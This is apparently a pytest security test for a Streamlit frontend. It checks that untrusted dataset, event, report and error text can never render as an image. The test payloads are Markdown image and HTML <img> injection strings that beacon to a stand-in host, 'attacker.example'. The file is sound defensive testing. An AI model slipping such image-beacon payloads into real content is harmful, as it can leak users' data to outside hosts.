"""No UI surface may render an image from untrusted text (review M2, review-2 M4).

The bug was fixed three times in three places: ``st.markdown`` in the report (review M2),
again when the UI was rewritten (round 3), and ``st.metric`` values (review-2 M4). Each fix
came with a test for that one surface. This file covers every surface at once, so a new one
cannot regress silently:

* every public function of ``frontend/render.py`` and ``frontend/ui_helpers.py`` and every
  function of ``frontend/app.py`` must be classified below (a new function fails
  :func:`test_every_frontend_function_is_classified` until it is);
* each renderer is fed text containing a Markdown image **and** an HTML ``<img>`` tag;
* ``app.py`` runs against a recording fake Streamlit and a mock API that puts that text in
  every untrusted field (dataset metadata, sample catalog, events, report, key numbers, errors,
  approval reasons). Every string handed to a Streamlit call that renders Markdown or HTML is
  rendered the way Streamlit would (raw HTML only with ``unsafe_allow_html=True`` / ``st.html``)
  and must contain no ``<img>`` element.
"""

from __future__ import annotations

import importlib.util
import inspect
import json
import sys
import types
from collections.abc import Callable, Iterator
from html.parser import HTMLParser
from pathlib import Path
from typing import Any

import httpx
import pytest

FRONTEND = Path(__file__).resolve().parents[2] / "frontend"
sys.path.insert(0, str(FRONTEND))

import render  # noqa: E402
import ui_helpers  # noqa: E402

markdown_it = pytest.importorskip("markdown_it")

HOST = "attacker.example"
PAYLOAD = (
    f"before ![x](https://{HOST}/md?d=42) and "
    f'<img src="https://{HOST}/html?d=42" onerror="x"> after'
)
# Short forms that survive the UI's clipping (key-number values are cut to 40 characters).
MD_SHORT = f"![](//{HOST}/m)"
HTML_SHORT = f"<img src=//{HOST}/h>"
KEY_NUMBERS = {PAYLOAD: PAYLOAD, MD_SHORT: MD_SHORT, HTML_SHORT: HTML_SHORT, "rows": 3, "s": 0.25}
CHART = "/artifacts/job1/chart-1a2b3c4d.png"


# ---------------------------------------------------------------- what "renders an image" means


class _ImgFinder(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.found = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.found |= tag in {"img", "image", "picture", "source", "svg"}


def html_has_image(html: str) -> bool:
    p = _ImgFinder()
    p.feed(html)
    p.close()
    return p.found


def markdown_has_image(md: str, allow_html: bool = False) -> bool:
    """Render ``md`` as Streamlit does: raw HTML passes only with ``unsafe_allow_html``."""
    parser = markdown_it.MarkdownIt("commonmark", {"html": allow_html}).enable("table")
    return html_has_image(parser.render(md))


def test_the_checks_catch_both_payloads() -> None:
    assert markdown_has_image(f"![x](https://{HOST}/a)")
    assert markdown_has_image(f"![x][1]\n\n[1]: https://{HOST}/a")
    assert markdown_has_image(f'<img src="https://{HOST}/a">', allow_html=True)
    assert not markdown_has_image(f'<img src="https://{HOST}/a">')  # escaped by Streamlit
    assert html_has_image(f'<div><img src="https://{HOST}/a"></div>')
    assert markdown_has_image(PAYLOAD) and markdown_has_image(PAYLOAD, allow_html=True)
    assert html_has_image(PAYLOAD)
    assert len(MD_SHORT) <= 40 and markdown_has_image(MD_SHORT)
    assert len(HTML_SHORT) <= 40 and markdown_has_image(HTML_SHORT, allow_html=True)


# ---------------------------------------------------------------- render.py and ui_helpers.py

EVENTS: list[tuple[str, dict[str, Any]]] = [
    ("plan", {"plan": PAYLOAD}),
    ("route", {"tier": PAYLOAD, "model": PAYLOAD, "source": "fallback", "reason": PAYLOAD}),
    (
        "escalation",
        {"from_tier": PAYLOAD, "to_tier": "L3", "to_model": PAYLOAD, "trigger": PAYLOAD},
    ),
    ("semantic_retrieval", {"metrics": [PAYLOAD], "error": PAYLOAD}),
    ("tool_call", {"name": PAYLOAD, "input": {"query": PAYLOAD}}),
    ("tool_call", {"name": "run_python", "input": {"code": PAYLOAD}}),
    ("tool_call", {"name": "make_chart", "input": {"spec": {"title": PAYLOAD}}}),
    ("tool_call", {"name": "final_report", "input": {"markdown": PAYLOAD}}),
    (
        "tool_result",
        {"name": PAYLOAD, "ok": True, "summary": f"{PAYLOAD}\n| a |\n|---|\n| {PAYLOAD} |"},
    ),
    ("tool_result", {"name": "run_sql", "ok": False, "summary": PAYLOAD}),
    ("critic", {"verdict": PAYLOAD, "issues": [PAYLOAD], "suggested_fix": PAYLOAD}),
    ("approval_required", {"id": "a1", "tool": PAYLOAD, "reasons": [PAYLOAD], "input": {}}),
    (
        "approval_decision",
        {"tool": PAYLOAD, "approved": False, "decided_by": PAYLOAD, "note": PAYLOAD},
    ),
    ("stop", {"status": PAYLOAD, "detail": PAYLOAD}),
    ("error", {"message": PAYLOAD}),
    ("llm_call", {"model": PAYLOAD, "purpose": PAYLOAD, "usd": 0.01, "input_tokens": 10}),
]
REPORT = (
    f"# {PAYLOAD}\n\n{PAYLOAD}\n\n![chart]({CHART})\n\n![a]({CHART}?d=1)\n\n"
    f"![ref][r]\n\n[r]: https://{HOST}/ref\n\n| {PAYLOAD} |\n|---|\n| {PAYLOAD} |\n"
)


def _report_md(parts: list[tuple[str, str, str]]) -> list[str]:
    assert {p[1] for p in parts if p[0] == "chart"} <= {CHART}, parts
    return [p[1] if p[0] == "md" else p[2] for p in parts]


# name -> (surface, call returning the strings it renders). Surfaces: "md" (st.markdown and
# Markdown labels, no raw HTML) or "html" (st.html).
HELPERS: dict[str, tuple[str, Callable[[], list[str]]]] = {
    "safe_md": ("md", lambda: [render.safe_md(PAYLOAD)]),
    "code_span": ("md", lambda: [render.code_span(PAYLOAD)]),
    "report_parts": ("md", lambda: _report_md(render.report_parts(REPORT, [CHART]))),
    "inline_html": ("html", lambda: [ui_helpers.inline_html(PAYLOAD)]),
    "step_html": (
        "html",
        lambda: [
            ui_helpers.step_html(
                ui_helpers.Step(PAYLOAD, PAYLOAD, PAYLOAD, PAYLOAD, PAYLOAD, bullets=[PAYLOAD])
            )
        ],
    ),
    "step_view": (
        "html",
        lambda: [
            ui_helpers.step_html(s)
            for e, d in EVENTS
            if (s := ui_helpers.step_view(e, d)) is not None
        ],
    ),
    "scalar_numbers": (
        "md",
        lambda: [s for pair in ui_helpers.scalar_numbers(KEY_NUMBERS) for s in pair],
    ),
}
# Public helpers that return no displayed text of their own (each with the reason).
NOT_RENDERERS = {
    "is_artifact_url": "predicate",
    "split_report": "splits images out of the report; report_parts is its renderer",
    "summarize_output": "plain text that reaches the UI only through step_view/step_html",
    "iter_sse": "SSE parser",
    "model_costs": "numbers for st.dataframe (not Markdown)",
}

# app.py functions: each is either driven by test_app_renders_no_untrusted_image (directly or
# through the page script) or does not render.
APP_RENDERERS = {
    "render_step",
    "render_event",
    "render_timeline",
    "render_approval_panel",
    "render_report",
    "render_costs",
    "render_trace",
    "render_result",
    "follow_job",
    "start_job",
    "detail_of",
    "timeline_label",
    "timeline_stats",
}
APP_NOT_RENDERERS = {
    "api": "HTTP client",
    "load_samples": "fetches the catalog (rendered by the page script)",
    "fetch_artifact": "fetches chart bytes",
    "stream_events": "SSE client",
    "reset_job": "state",
    "use_dataset": "state",
    "on_sample_change": "callback, state only",
    "on_example": "callback, state only",
    "running_cost": "a float",
}


def _public_functions(module: types.ModuleType) -> set[str]:
    return {
        name
        for name, obj in vars(module).items()
        if inspect.isfunction(obj)
        and obj.__module__ == module.__name__
        and not name.startswith("_")
    }


@pytest.mark.parametrize("name", sorted(HELPERS))
def test_helper_output_has_no_image(name: str) -> None:
    surface, call = HELPERS[name]
    outputs = call()
    assert outputs and any(HOST in o for o in outputs), "the payload must reach the output"
    for out in outputs:
        has = html_has_image(out) if surface == "html" else markdown_has_image(out)
        assert not has, f"{name} renders an image: {out!r}"


# ---------------------------------------------------------------- app.py with a fake Streamlit


class _Stop(Exception):
    """st.stop() / st.rerun()."""


class SessionState(dict):  # type: ignore[type-arg]
    def __getattr__(self, name: str) -> Any:
        try:
            return self[name]
        except KeyError as e:
            raise AttributeError(name) from e

    def __setattr__(self, name: str, value: Any) -> None:
        self[name] = value


# Calls whose positional text is not Markdown. Their Markdown kwargs (label, caption, help) are
# still checked; st.html is checked as HTML.
LITERAL = {
    "code", "json", "dataframe", "table", "text", "image", "set_page_config", "container",
    "columns", "form", "divider", "html", "tabs", "download_button", "selectbox", "multiselect",
}  # fmt: skip
MD_KWARGS = {"label", "caption", "help", "value", "delta", "body"}


class FakeStreamlit(types.ModuleType):
    """Records every ``st.*`` call (and calls on columns, tabs, status boxes)."""

    def __init__(self) -> None:
        super().__init__("streamlit")
        self.calls: list[tuple[str, tuple[Any, ...], dict[str, Any]]] = []
        self.session_state = SessionState()
        self.column_config = types.SimpleNamespace(NumberColumn=lambda *a, **k: None)

    def cache_data(self, *args: Any, **kwargs: Any) -> Any:
        if args and callable(args[0]):
            return args[0]
        return lambda f: f

    cache_resource = cache_data

    def stop(self) -> None:
        raise _Stop("stop")

    def rerun(self) -> None:
        raise _Stop("rerun")

    def __getattr__(self, name: str) -> Any:
        if name.startswith("__"):
            raise AttributeError(name)
        return _Element(self, name)


class _Element:
    """``st.<name>`` (callable), and what it returns: a container/column/status box."""

    def __init__(self, st: FakeStreamlit, name: str) -> None:
        self._st, self._name = st, name

    def __call__(self, *args: Any, **kwargs: Any) -> Any:
        name = self._name
        self._st.calls.append((name, args, kwargs))
        if name == "columns":
            n = args[0] if isinstance(args[0], int) else len(args[0])
            return [_Element(self._st, "column") for _ in range(n)]
        if name == "tabs":
            self._st.calls.append(("tab labels", tuple(args[0]), {}))
            return [_Element(self._st, "tab") for _ in args[0]]
        if name in {"button", "form_submit_button", "checkbox"}:
            return False
        if name in {"text_input", "text_area"}:
            return ""
        if name == "multiselect":
            return kwargs.get("default", [])
        if name in {"selectbox", "file_uploader"}:
            return None
        return _Element(self._st, name)

    def __getattr__(self, name: str) -> Any:
        if name.startswith("__"):
            raise AttributeError(name)
        return _Element(self._st, name)

    def __enter__(self) -> _Element:
        return self

    def __exit__(self, *exc: Any) -> None:
        return None


def rendered_strings(st: FakeStreamlit) -> Iterator[tuple[str, str, bool]]:
    """``(call, text, raw HTML allowed)`` for everything Streamlit would render as Markdown,
    and ``("html", text, True)`` for ``st.html``."""
    for name, args, kwargs in st.calls:
        if name == "html":
            yield name, str(args[0]), True
            continue
        allow_html = bool(kwargs.get("unsafe_allow_html"))
        if name not in LITERAL:
            for a in args:
                if isinstance(a, str):
                    yield name, a, allow_html
        for k, v in kwargs.items():
            if k in MD_KWARGS and isinstance(v, str):
                yield f"{name}({k}=)", v, allow_html


JOB_ID = "job1"
SSE_EVENTS = [(e, d) for e, d in EVENTS if e != "approval_required"]
APPROVAL = dict(EVENTS[[e for e, _ in EVENTS].index("approval_required")][1])
APPROVAL.update(input={"query": PAYLOAD}, timeout_s=30)


def _sse() -> str:
    lines = []
    for seq, (event, data) in enumerate([*SSE_EVENTS, ("end", {"status": "completed"})], 1):
        lines.append(f"event: {event}\ndata: {json.dumps({**data, 'seq': seq})}\n")
    return "\n".join(lines) + "\n"


def _job(status: str) -> dict[str, Any]:
    return {
        "job_id": JOB_ID,
        "status": status,
        "error": PAYLOAD,
        "duration_seconds": 1.5,
        "cost": {"usd": 0.01, "input_tokens": 10, "output_tokens": 5, "cache_read_tokens": 3},
        "result": {
            "key_numbers": {**KEY_NUMBERS, "ok": True},
            "artifacts": [
                {"url": CHART, "path": f"job1/{PAYLOAD}.png"},
                {"url": "/artifacts/job1/extra-0000.png", "path": f"job1/{PAYLOAD}"},
            ],
        },
        "trace": [{"type": e, "data": d} for e, d in EVENTS],
    }


DATASET = {
    "dataset_id": "ds1",
    "filename": PAYLOAD,
    "title": PAYLOAD,
    "description": PAYLOAD,
    "columns": [PAYLOAD] * 20,
    "rows": 1000,
    "questions": [PAYLOAD],
}


def _api(job_status: str) -> Callable[[httpx.Request], httpx.Response]:
    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == "/datasets/samples":
            return httpx.Response(200, json=[DATASET])
        if path == "/healthz":
            return httpx.Response(200, json={"job_store": "sqlite"})
        if path == f"/jobs/{JOB_ID}/events":
            return httpx.Response(200, text=_sse(), headers={"content-type": "text/event-stream"})
        if path == f"/jobs/{JOB_ID}/report":
            return httpx.Response(200, text=REPORT)
        if path == f"/jobs/{JOB_ID}":
            return httpx.Response(200, json=_job(job_status))
        if path.startswith("/artifacts/"):
            return httpx.Response(200, content=b"\x89PNG")
        # /ask, /jobs/{id}/approve, /datasets: errors that echo data back
        return httpx.Response(409, json={"detail": PAYLOAD})

    return handler


def _load_app(
    monkeypatch: pytest.MonkeyPatch, job_status: str, state: dict[str, Any]
) -> tuple[Any, FakeStreamlit]:
    st = FakeStreamlit()
    st.session_state.update(state)
    monkeypatch.setitem(sys.modules, "streamlit", st)
    real_client = httpx.Client
    transport = httpx.MockTransport(_api(job_status))
    monkeypatch.setattr(
        httpx, "Client", lambda *a, **k: real_client(*a, **{**k, "transport": transport})
    )
    spec = importlib.util.spec_from_file_location("frontend_app_under_test", FRONTEND / "app.py")
    assert spec and spec.loader
    app = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(app)  # the page script runs top to bottom
    except _Stop:
        pass
    return app, st


def test_every_frontend_function_is_classified(monkeypatch: pytest.MonkeyPatch) -> None:
    helpers = _public_functions(render) | _public_functions(ui_helpers)
    unclassified = helpers - set(HELPERS) - set(NOT_RENDERERS)
    assert not unclassified, f"classify these in HELPERS or NOT_RENDERERS: {unclassified}"
    app, _ = _load_app(monkeypatch, "completed", {})
    funcs = _public_functions(app)
    unclassified = funcs - APP_RENDERERS - set(APP_NOT_RENDERERS)
    assert not unclassified, f"classify these in APP_RENDERERS or APP_NOT_RENDERERS: {unclassified}"
    assert APP_RENDERERS <= funcs and set(APP_NOT_RENDERERS) <= funcs


def _check(st: FakeStreamlit) -> int:
    reached = 0
    for call, text, allow_html in rendered_strings(st):
        has = html_has_image(text) if call == "html" else markdown_has_image(text, allow_html)
        assert not has, f"st.{call} renders an image: {text!r}"
        reached += HOST in text
    return reached


@pytest.mark.parametrize("job_status", ["completed", "failed"])
def test_app_renders_no_untrusted_image(monkeypatch: pytest.MonkeyPatch, job_status: str) -> None:
    # The page script: dataset header, sample catalog and example questions, finished job
    # (timeline, report with key numbers and charts, costs, raw trace).
    state = {
        "dataset": {**DATASET, "source": "upload"},
        "job_id": JOB_ID,
        "events": list(SSE_EVENTS),
        "following": False,
        "final_status": "completed",
    }
    app, st = _load_app(monkeypatch, job_status, state)
    called = {name for name, _, _ in st.calls}
    assert {"html", "markdown", "metric", "caption", "image", "button"} <= called
    if job_status == "failed":
        assert "error" in called

    # Every renderer directly, including the ones the page reaches only in other states.
    S = st.session_state
    job = _job(job_status)
    for event, data in EVENTS:
        app.render_event(event, data)
    app.render_step(ui_helpers.Step(PAYLOAD, PAYLOAD, detail=PAYLOAD, code=PAYLOAD))
    app.render_report(job, REPORT)
    app.render_costs(job, [(e, d) for e, d in EVENTS])
    app.render_trace(JOB_ID, job["trace"])
    app.render_result(JOB_ID)
    for pending in (APPROVAL, None):
        S.pending = pending
        app.render_timeline()
    app.render_approval_panel(JOB_ID, APPROVAL)
    S.update(events=[], last_seq=0, pending=None)
    with pytest.raises(_Stop):  # the stream ends with a rerun
        app.follow_job(JOB_ID)
    app.start_job(PAYLOAD)  # 409 with the payload echoed in "detail"
    for label in (
        app.timeline_label(),
        app.timeline_label(PAYLOAD),
        app.detail_of(httpx.Response(400, json={"detail": PAYLOAD})),
        app.detail_of(httpx.Response(400, text=PAYLOAD)),
    ):
        st.markdown(label)

    reached = _check(st)
    assert reached >= 40, f"only {reached} rendered strings carried the payload"
